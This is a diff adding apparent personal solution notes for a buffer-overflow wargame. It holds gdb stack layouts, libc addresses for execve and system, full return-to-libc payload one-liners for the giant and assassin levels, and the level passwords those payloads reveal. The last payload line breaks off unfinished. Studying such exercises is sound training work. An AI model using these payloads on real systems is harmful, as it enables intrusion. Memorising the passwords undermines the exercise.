@@ -1,0 +1,53 @@
+case 1: gdb, no arg
+giantcp:
+	0xbffffef0: "/bin/my-pass"
+	0xbffffc10: NULL
+	0xbffffc0c: 0xbfffff5e
+	
+	0xbfffffae8: ebp
+	0xbfffffaec: ret | execve=0x400a9d48
+	0xbfffffaf0: "aaaa"
+	0xbfffffaf4: pointer to "my-pass"=0xbfffff5e
+	0xbfffffaf8: pointer to command argv=0xbfffff0c
+	0xbfffffafc: pointer to array of envp=0xbfffff10
+
+	0xbfffffc0c - 0xbfffffb00 = 268
+
+case 2: gdb, r "$(for x in `seq 1 44`; do printf "\x90"; done)$(printf "\48\x9d\x0a\x40aaaa\x5e\xff\xff\xbf\x0c\xff\xff\xbf\x10\xff\xff\xbf")$(for x in `seq 1 268`; do printf "\x90"; done)$(printf "\x5e\xff\xff\xbf")"
+giantcp:
+	
+
+case 3: gdb, r "$(for x in `seq 1 44`; do printf "\x90"; done)$(printf "\x48\x9d\x0a\x40")aaaa$(printf "\xf9\xbf\x0f\x40\x98\xfa\xff\xbf\x9c\xfa\xff\xbf")$(for x in `seq 1 280`; do printf "\x90"; done)$(printf "\xf9\xbf\x0f\x40")"
+exam:
+	0xbffffef0: "/bin/my-pass"
+	0xbffffa9c: NULL
+	0xbffffa98: 0xbffffef0
+	
+	0xbfffff968: ebp
+	0xbfffff96c: ret | execve=0x400a9d48
+	0xbfffff970: "aaaa"
+	0xbfffff974: pointer to "/bin/my-pass"=0xbffffef0
+	0xbfffff978: pointer to command argv=0xbffffaa8
+	0xbfffff97c: pointer to array of envp=0xbffffaac
+
+	0xbfffffc0c - 0xbfffffb00 = 280
+
+case 3 ebp - case 1 ebp = 0xbfffff
+
+ROP: Return Oriented Programming
+
+fake EBP: FEBP
+
+printf: 0x4006604c
+
+"/bin/sh": 0x400fbff9
+
+giant: one step closer
+
+system: 0x40058ae0
+
+./assassin "$(for x in `seq 1 44`; do printf "\x90"; done)$(printf "\x1e\x85\x04\x08")$(printf "\xe0\x8a\x05\x40")aaaa$(printf "\xf9\xbf\x0f\x40")"
+
+assassin: pushing me away
+
+./zombieassassin $(for x in `seq 1 40`; do printf "\x90"; done)$(printf "\x")
